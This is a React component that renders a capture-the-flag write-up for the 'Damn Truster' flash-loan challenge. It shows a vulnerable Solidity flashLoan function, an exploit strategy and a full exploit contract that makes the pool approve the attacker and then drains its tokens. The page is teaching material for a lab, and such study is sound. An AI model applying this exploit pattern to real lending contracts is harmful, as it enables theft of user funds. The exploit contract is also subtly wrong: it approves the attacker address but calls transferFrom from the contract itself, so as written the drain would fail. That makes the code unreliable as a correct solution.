import React from 'react';
import { Accordion, Card, Badge } from 'react-bootstrap';
import { Lock, ChevronDown, AlertTriangle, Target, BookText, Zap, Code } from 'lucide-react';

const DamnTruster = () => {
  return (
    <div className="mb-4">
      <h3 className="d-flex align-items-center gap-2 mb-3">
        <Lock size={20} className="text-muted" />
        Damn Truster CTF Challenge
      </h3>
      
      <Accordion defaultActiveKey="0">
        <Card>
          <Accordion.Header as={Card.Header} className="d-flex justify-content-between align-items-center">
            <div className="d-flex align-items-center gap-2">
              <AlertTriangle size={18} className="text-warning" />
              <strong>View Challenge Solution</strong>
            </div>
            <ChevronDown size={18} />
          </Accordion.Header>
          <Accordion.Body>
            <Card.Body>
              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Target size={18} />
                  Challenge Goal
                </h5>
                <p>Drain all 1 million DVT tokens from the pool starting with 0 DVT, in a single transaction.</p>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <BookText size={18} />
                  Pool Setup
                </h5>
                <ul>
                  <li>Holds 1 million DVT tokens</li>
                  <li>Offers free flash loans</li>
                </ul>
                <h6 className="mt-3">Vulnerable flashLoan function:</h6>
                <pre className="bg-light p-2 rounded">
{`function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
) external {
    uint256 balanceBefore = token.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    token.transfer(borrower, borrowAmount);
    target.functionCall(data); // ← DANGEROUS: no validation

    uint256 balanceAfter = token.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan not paid back");
}`}
                </pre>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <AlertTriangle size={18} className="text-danger" />
                  Vulnerability Breakdown
                </h5>
                <h6>1. Unrestricted function call</h6>
                <p>The <code>target.functionCall(data)</code> lets any contract be called with arbitrary data:</p>
                <ul>
                  <li><code>target</code> can be any contract (e.g., the DVT token contract)</li>
                  <li><code>data</code> can be any payload (e.g., an <code>approve()</code> call)</li>
                </ul>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Zap size={18} className="text-primary" />
                  Exploit Strategy
                </h5>
                <ol>
                  <li>
                    Call <code>flashLoan()</code> with:
                    <ul>
                      <li><code>borrowAmount = 0</code> (no actual loan needed)</li>
                      <li><code>target = DVT token contract</code></li>
                      <li><code>data = approve(attacker, 1_000_000e18)</code> call</li>
                    </ul>
                  </li>
                  <li>This tricks the pool into approving the attacker to spend its tokens</li>
                  <li>Then call <code>transferFrom()</code> to drain all tokens</li>
                </ol>
                <pre className="bg-light p-2 rounded mt-2">
{`// Malicious calldata
abi.encodeWithSignature(
    "approve(address,uint256)",
    attacker,
    1_000_000 ether
);`}
                </pre>
              </div>

              <div>
                <h5 className="d-flex align-items-center gap-2">
                  <Code size={18} />
                  Exploit Contract
                </h5>
                <pre className="bg-light p-3 rounded">
{`contract TrusterExploit {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    address public attacker;

    constructor(address _token, address _pool, address _attacker) {
        token = IERC20(_token);
        pool = TrusterLenderPool(_pool);
        attacker = _attacker;
    }

    function attack() external {
        // Build malicious calldata for DVT.approve()
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            1_000_000 ether
        );

        // Execute flash loan with arbitrary call
        pool.flashLoan(0, attacker, address(token), data);

        // Drain all tokens using the approval
        token.transferFrom(address(pool), attacker, 1_000_000 ether);
    }
}`}
                </pre>
              </div>
            </Card.Body>
          </Accordion.Body>
        </Card>
      </Accordion>
    </div>
  );
};

export default DamnTruster;